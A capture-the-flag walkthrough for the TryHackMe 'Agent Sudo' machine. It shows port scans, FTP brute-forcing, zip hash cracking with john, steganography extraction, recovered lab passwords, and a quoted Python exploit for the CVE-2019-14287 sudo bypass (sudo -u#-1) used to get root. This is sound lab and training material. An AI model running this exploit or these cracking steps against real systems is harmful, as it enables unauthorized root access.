
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Agent_sudo/images/91-1.png)

As always, i will start with a ports scan.

From all available ports, this machine has only 3 ports open: 21, 22, 80. Based on this i  think i will enumerate in depth the ftp service and http.

```text
nmap -sS 10.10.190.224 -p- -T4
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-11 05:01 EDT
Nmap scan report for 10.10.190.224
Host is up (0.056s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

```
I will use nmap again, but this time i will scan with some defaults scripts.

```text
nmap -sV -sC -p21,22,80 10.10.190.224
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-11 04:45 EDT
Nmap scan report for 10.10.190.224
Host is up (0.074s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```
Let's start with hhtp service. The welcome page has this message:

![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Agent_sudo/images/91-2.png)

From this image i understand i need to change the user-agent of the request with my own, but i don't know which is my agent name. Fortunately, the hint specifies my agent's name first letter, which is C. I used curl to fetch the same page, but with the specified user-agent.

```text

curl -iLv http://10.10.190.224 -A C

*   Trying 10.10.190.224:80...
* TCP_NODELAY set
* Connected to 10.10.190.224 (10.10.190.224) port 80 (#0)
> GET / HTTP/1.1
> Host: 10.10.190.224
> User-Agent: C
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 Found
HTTP/1.1 302 Found
< Date: Fri, 11 Sep 2020 09:12:51 GMT
Date: Fri, 11 Sep 2020 09:12:51 GMT
< Server: Apache/2.4.29 (Ubuntu)
Server: Apache/2.4.29 (Ubuntu)
< Location: agent_C_attention.php
Location: agent_C_attention.php
< Content-Length: 218
Content-Length: 218
< Content-Type: text/html; charset=UTF-8
Content-Type: text/html; charset=UTF-8

< 
* Ignoring the response-body
* Connection #0 to host 10.10.190.224 left intact
* Issue another request to this URL: 'http://10.10.190.224/agent_C_attention.php'
* Found bundle for host 10.10.190.224: 0x556eeb40a3b0 [serially]
* Can not multiplex, even if we wanted to!
* Re-using existing connection! (#0) with host 10.10.190.224
* Connected to 10.10.190.224 (10.10.190.224) port 80 (#0)
> GET /agent_C_attention.php HTTP/1.1
> Host: 10.10.190.224
> User-Agent: C
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
HTTP/1.1 200 OK
< Date: Fri, 11 Sep 2020 09:12:51 GMT
Date: Fri, 11 Sep 2020 09:12:51 GMT
< Server: Apache/2.4.29 (Ubuntu)
Server: Apache/2.4.29 (Ubuntu)
< Vary: Accept-Encoding
Vary: Accept-Encoding
< Content-Length: 177
Content-Length: 177
< Content-Type: text/html; charset=UTF-8
Content-Type: text/html; charset=UTF-8

< 
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R 

* Connection #0 to host 10.10.190.224 left intact
```

From this note i got that my password is weak and thus can be easily bruteforced. Based on first scan i can either have a weak password for the ssh service or fpt. I decided to bruteforce the ftp password as i think there are some files which can be handy. 

![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Agent_sudo/images/91-3.png)

Here are a note and some images. I only need the note, but will download all the files.

```text

ftp 10.10.190.224
Connected to 10.10.190.224.
220 (vsFTPd 3.0.3)
Name (10.10.190.224:root): chris
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Oct 29  2019 .
drwxr-xr-x    2 0        0            4096 Oct 29  2019 ..
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.

```

The note says:

```text
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

If the password is in one of the files it either mean there are some files added to the image or the password is hidden in the pixels. The file cutie.png has an archive in it.

![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Agent_sudo/images/91-4.png)

The archive is password protected and this is a good momment to use john the ripper.

```text
First, it is necessary to extract the hash using this command: zip2john 8702.zip > hash

Then, crack the hash:

john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)
1g 0:00:00:01 DONE (2020-09-11 05:31) 0.6993g/s 17186p/s 17186c/s 17186C/s michael!..280789
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

I ran into an issue when i wanted to extract the archive with unzip, but i managed to resolve the isssue with 7z.The command is:  7z x 8702.zip

The unzipped file is a text file:
```text
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R

```

This string looks like a password and i haven't found the password stored in a picture. I can assume this time i will use steghide on one of the images.

![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Agent_sudo/images/91-5.png)

The message is:

```text
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```
This found password and username can be used only to log into the ssh service, as it is the only one remained. The user james is in the lxd group which can be used to escalate to root, but i check if there other simpler ways to escalate privileges.

![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Agent_sudo/images/91-6.png)

The user flag, as always, is in the user's directory. Here is also an image, which i will download to my machine using scp.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Agent_sudo/images/91-7.png)
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Agent_sudo/images/91-8.png)

Let's check the sudo privileges of this user. James can't run the command /bin/bash as root.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Agent_sudo/images/91-9.png)

I found a cve, CVE-2019-14287, which can be used to escalate privileges.

```python
# Exploit Title : sudo 1.8.27 - Security Bypass
# Date : 2019-10-15
# Original Author: Joe Vennix
# Exploit Author : Mohin Paramasivam (Shad0wQu35t)
# Version : Sudo <1.2.28
# Tested on Linux
# Credit : Joe Vennix from Apple Information Security found and analyzed the bug
# Fix : The bug is fixed in sudo 1.8.28
# CVE : 2019-14287

'''Check for the user sudo permissions

sudo -l 

User hacker may run the following commands on kali:
    (ALL, !root) /bin/bash


So user hacker can't run /bin/bash as root (!root)


User hacker sudo privilege in /etc/sudoers

# User privilege specification
root    ALL=(ALL:ALL) ALL

hacker ALL=(ALL,!root) /bin/bash


With ALL specified, user hacker can run the binary /bin/bash as any user

EXPLOIT: 

sudo -u#-1 /bin/bash

Example : 

hacker@kali:~$ sudo -u#-1 /bin/bash
root@kali:/home/hacker# id
uid=0(root) gid=1000(hacker) groups=1000(hacker)
root@kali:/home/hacker#

Description :
Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv
-u#-1 returns as 0 which is root's id

and /bin/bash is executed with root permission
Proof of Concept Code :

How to use :
python3 sudo_exploit.py

'''


#!/usr/bin/python3

import os

#Get current username

username = input("Enter current username :")


#check which binary the user can run with sudo

os.system("sudo -l > priv")


os.system("cat priv | grep 'ALL' | cut -d ')' -f 2 > binary")

binary_file = open("binary")

binary= binary_file.read()

#execute sudo exploit

print("Lets hope it works")

os.system("sudo -u#-1 "+ binary)
```
Let's run the exploit.  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Agent_sudo/images/91-10.png)

And now James can run any command as any user.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Agent_sudo/images/91-11.png)
